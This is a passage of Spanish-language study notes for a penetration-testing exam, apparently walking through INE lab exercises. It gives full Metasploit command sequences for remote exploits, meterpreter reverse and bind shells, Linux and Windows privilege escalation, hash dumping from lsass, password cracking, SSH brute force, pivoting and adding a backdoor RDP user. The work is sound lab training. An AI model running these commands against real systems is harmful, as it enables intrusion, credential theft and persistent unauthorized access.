# chequeamos nuestra IP de atacante para setear LHOST correctamente

set RHOSTS demo.ine.local
set LHOST 192.72.201.2
set TARGETURI /
exploit
# explota el upload arbitrario de PHP -> RCE -> meterpreter

sysinfo
getuid
# confirmamos: Ubuntu server, sesión corriendo como www-data (usuario típico
# de los procesos de Apache, privilegios bajos)

ls
cat THIS_IS_FLAG5234234324/FLAG1
# FLAG1: e56938b6e91af44bc116b494384b579e

# --- Escalación de privilegios vía Exim smtpd ---

searchsploit exim 4.89
# Exim 4.89 es vulnerable a un exploit local de privilege escalation

background
search exim4
use exploit/linux/local/exim4_deliver_message_priv_esc
show options
# módulo válido para Exim 4.87 - 4.91
# requiere SESSION = id de la sesión meterpreter ya obtenida (para pivotear desde ahí)

set SESSION 1
set PAYLOAD linux/x86/meterpreter/reverse_tcp
# se cambia el payload default (x64) a x86 según arquitectura del target
set LHOST 192.72.201.2
exploit
getuid
# éxito -> nueva sesión meterpreter con privilegios root

ls /root
cat /root/FLAG2
# FLAG2: 79ff114680e11e44a71d773068485a9e

# --- Pivoting hacia segunda subnet ---

ipconfig
# el host demo.ine.local tiene 2 interfaces -> hay otra subnet accesible
# (192.161.244.0/24)

run autoroute -s 192.161.244.0/24
# agrega ruta hacia la nueva subnet a través de la sesión meterpreter actual

background
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.161.244.3-5
run
# port scan interno (a través del pivot) -> puerto 80 abierto en 192.161.244.3

sessions -i 2
portfwd add -l 1234 -p 80 -r 192.161.244.3
portfwd list
# port forward: puerto remoto 80 -> puerto local 1234
# así podemos acceder al servicio interno desde nuestra propia máquina

background
nmap -sV -p 1234 localhost
# escaneamos localhost:1234 (que en realidad apunta al target interno)
# resultado: Apache httpd 2.2.22

# Firefox -> http://localhost:1234
# nada relevante a simple vista -> Ver código fuente de la página (View Page Source)
# se encuentra un <iframe> apuntando a /cgi-bin/stats -> posible vector CGI

use auxiliary/scanner/http/apache_mod_cgi_bash_env
show options
set RHOSTS 192.161.244.3
set TARGETURI /cgi-bin/stats
exploit
# auxiliary scanner para detectar Shellshock (CVE-2014-6271)
# vulnerabilidad en bash: si se le pasa una variable de entorno con cierto patrón,
# bash ejecuta comandos arbitrarios embebidos en ella
# resultado: target vulnerable a Shellshock

use exploit/multi/http/apache_mod_cgi_bash_env_exec
show options
# el payload default (linux/x86/meterpreter/reverse_tcp) NO sirve acá:
# 192.161.244.3 no es accesible directo desde Kali (está detrás del pivot)
# reverse_tcp "funcionaría" pero nunca llegaría la conexión de vuelta

set PAYLOAD linux/x86/meterpreter/bind_tcp
# bind_tcp = el target abre el puerto y escucha, nosotros nos conectamos a él
# (en vez de que el target intente conectarse de vuelta a nosotros)
set RHOSTS 192.161.244.3
set TARGETURI /cgi-bin/stats
exploit
getuid
# éxito -> meterpreter en el segundo target, vía Shellshock + pivoting

# Puntos clave para el examen
# searchsploit = primer paso para buscar exploits públicos de apps/versiones conocidas
# www-data = usuario low-priv típico de procesos Apache en Ubuntu -> requiere priv esc
# elegir bien la arquitectura del payload (x86 vs x64) según el target
# autoroute + portfwd = técnica de pivoting para alcanzar y exponer servicios
#   de una subnet interna no accesible directamente
# reverse_tcp vs bind_tcp:
#   reverse_tcp = target se conecta a nosotros (falla si no hay ruta directa)
#   bind_tcp = nosotros nos conectamos al target (mejor detrás de un pivot)
# Shellshock (CVE-2014-6271) = inyección de comandos vía variables de entorno mal
#   parseadas por bash, típico en scripts CGI antiguos
```

### ~ Windows Post-Exploitation

#### Dumping & Cracking NTLM Hashes

```bash
nmap demo.ine.local
# scan inicial, múltiples puertos abiertos

nmap -sV -p 80 demo.ine.local
# identifica versión del servicio web -> BadBlue 2.7

searchsploit badblue 2.7
# busca exploits públicos para BadBlue 2.7 -> hay módulo de Metasploit disponible

/etc/init.d/postgresql start
# levanta PostgreSQL, necesario para que Metasploit guarde resultados en su DB
# (hashes, credenciales, hosts, etc.)

msfconsole -q
use exploit/windows/http/badblue_passthru
set RHOSTS demo.ine.local
exploit
# explota BadBlue Passthru -> obtenemos sesión meterpreter

migrate -N lsass.exe
# lsass.exe = proceso de Windows que maneja autenticación y guarda credenciales
#             en memoria (hashes NTLM, tickets, etc.)
# migramos ahí para poder volcar los hashes con privilegios necesarios

hashdump
# vuelca los hashes NTLM de todos los usuarios del sistema (SAM database)

background
creds
# background = manda la sesión meterpreter a segundo plano
# creds = muestra todas las credenciales/hashes guardados en la base de datos de MSF
#         (confirma que hashdump los guardó correctamente)

use auxiliary/analyze/crack_windows
set CUSTOM_WORDLIST /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
exploit
# módulo auxiliar que toma los hashes NTLM guardados en la DB de MSF
# e intenta crackearlos offline contra una wordlist personalizada

# Resultado del cracking:
# Administrator: password
# bob: password1

# Puntos clave para el examen
# lsass.exe = proceso clave donde Windows guarda credenciales en memoria
#             -> migrar ahí antes de hacer hashdump
# hashdump = extrae los hashes NTLM de la SAM database local
# los hashes NTLM no se "descifran", se CRACKEAN (fuerza bruta/wordlist) porque
#   NTLM no es un algoritmo reversible
# creds = útil para ver de un vistazo todo lo que MSF ya capturó/guardó en su DB
# postgresql debe estar corriendo para que MSF pueda usar su base de datos
#   (hashdump, creds, workspaces, etc. dependen de esto)
```

#### Windows Post-Exploitation Lab

```bash
nmap demo.ine.local
# scan inicial, múltiples puertos abiertos

nmap -sV -p 80 demo.ine.local
# identifica servicio -> HFS 2.3 (HTTP File Server, servidor de archivos)

searchsploit hfs 2.3
# HFS 2.3 es vulnerable a RCE (Remote Command Execution)

msfconsole -q
search rejetto
use exploit/windows/http/rejetto_hfs_exec
show options
set RHOSTS demo.ine.local
exploit
# explota Rejetto HttpFileServer 2.3 -> obtenemos meterpreter

sysinfo
getuid
# target Windows, sesión con privilegios de administrator

getsystem
getuid
# getsystem = intenta escalar a privilegios SYSTEM (NT Authority) usando
# técnicas predefinidas:
# 0 = todas las técnicas disponibles
# 1 = Named Pipe Impersonation (In Memory/Admin)
# 2 = Named Pipe Impersonation (Dropper/Admin)
# 3 = Token Duplication (In Memory/Admin)
# 4 = Named Pipe Impersonation (RPCSS variant)
# en este caso funciona con Named Pipe Impersonation -> ahora somos SYSTEM

# --- Pivoting hacia demo1.ine.local (10.0.29.240) ---

shell
ping 10.0.29.240
# confirmamos que el segundo target es alcanzable DESDE el host comprometido
# (aunque no lo es directamente desde nuestra Kali)

# CTRL+C, y (para salir de la shell y volver a meterpreter)
run autoroute -s 10.0.29.240/20
# agrega ruta hacia esa subnet a través de la sesión meterpreter actual

run post/windows/gather/enum_applications
# enumera todas las aplicaciones instaladas en el host comprometido
# encontramos FileZilla Client 3.57.0 -> posible fuente de credenciales FTP guardadas

run post/multi/gather/filezilla_client_cred
# post module que extrae credenciales guardadas del cliente FileZilla
# (nota: a veces el output viene en formato no legible)

# Alternativa manual si el módulo falla: leer el XML de configuración directo
cat C:\\Users\\Administrator\\AppData\\Roaming\\FileZilla\\sitemanager.xml
# credenciales encontradas:
# Server: 10.0.29.240 | User: admin | Pass: FTPStrongPwd

cat /etc/proxychains4.conf
# verificamos configuración de proxychains -> socks4 en puerto 9050

background
use auxiliary/server/socks_proxy
show options
set SRVPORT 9050
set VERSION 4a
exploit
jobs
# levanta un proxy SOCKS4a sobre la sesión meterpreter, en el puerto que
# proxychains espera (9050), para poder rutear herramientas externas al pivot

proxychains nmap demo1.ine.local -sT -Pn -p 1-50
# -sT = connect scan (obligatorio con proxychains, -sS no sirve)
# -Pn = salta host discovery
# scan "seguro" vía proxy (los auxiliary scanners de MSF son más agresivos
# y pueden tirar la sesión)
# resultado: puertos 21 (FTP) y 22 (SSH) abiertos en el pivot

sessions -i 1
shell
net user guest_1 guestpwd /add
net localgroup "Remote Desktop Users" guest_1 /add
net user
# creamos un usuario nuevo y lo agregamos al grupo RDP
# (para tener acceso gráfico vía escritorio remoto sobre demo.ine.local, que
# ya sabíamos tenía el puerto 3389 expuesto)

xfreerdp /u:guest_1 /p:guestpwd /v:demo.ine.local
# nos conectamos por RDP con el usuario recién creado

# Desde la sesión RDP: abrimos FileZilla Client y nos conectamos a
# 10.0.29.240 con user: admin / pass: FTPStrongPwd
# encontramos un archivo usernames.txt -> lo descargamos y revisamos
# usuarios encontrados: administrator, sysadmin, student
# -> objetivo: la cuenta administrator

# CTRL+C, y (volver a meterpreter)
portfwd add -l 1234 -p 22 -r 10.0.29.240
portfwd list
# forward del puerto 22 (SSH) del pivot hacia nuestro puerto local 1234

nmap -sV -p 1234 localhost
# confirma OpenSSH corriendo (aunque el target es Windows -> raro pero posible)

proxychains hydra -l administrator -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo1.ine.local ssh
# fuerza bruta SSH vía proxychains contra el usuario administrator
# password encontrada: password1

background
use auxiliary/scanner/ssh/ssh_login
show options
set RHOSTS demo1.ine.local
set USERNAME administrator
set PASSWORD password1
set gatherproof false
exploit
sessions
# login SSH exitoso con las credenciales encontradas -> nueva sesión

sessions -i 2
dir C:\
type C:\FLAG1.txt
# Flag: a3dcb4d229de6fde0db5686dee47145d

# Puntos clave para el examen
# getsystem = escalación rápida a SYSTEM en Windows (named pipe / token duplication)
# enum_applications + filezilla_client_cred = buscar credenciales guardadas por
#   clientes FTP/apps instaladas es un vector post-exploit MUY común
# socks_proxy + proxychains = permite usar herramientas externas (nmap, hydra)
#   a través de una sesión meterpreter como pivot
# -sT obligatorio con proxychains (no soporta -sS/half-open)
# crear un usuario RDP nuevo = técnica típica para tener acceso GUI persistente
#   sin depender solo de la shell de meterpreter
# portfwd = expone un puerto remoto (dentro del pivot) como si fuera local,
#   para poder escanearlo/conectarte directo con herramientas normales
```

## 07 - Privilege Escalation

### ~ Privilege Escalation Scripts
### ~ Locally Stored Credentials
### ~ Service Exploits
### ~ Windows Registry
### ~ Impersonation Attacks
### ~ Advanced Techniques
### ~ Linux Privilege Escalation Techniques

## 08 - Lateral Movement & Pivoting

### ~ Windows Lateral Movement Techniques
### ~ Credential-Based Lateral Movement
### ~ Pass-the-Hash (PtH)
### ~ Linux Movement
### ~ Pivoting Techniques

## 09 - Active Directory Penetration Testing

### ~ Active Directory
### ~ AD Penetration Testing
### ~ AD Enumeration
### ~ AD Privilege Escalation
### ~ AD Lateral Movement
### ~ AD Persistence

## 10 - Command & Control (C2/C&C)

### ~ C2 Overview
### ~ Command & Control
### ~ PowerShell Empire & Starkiller

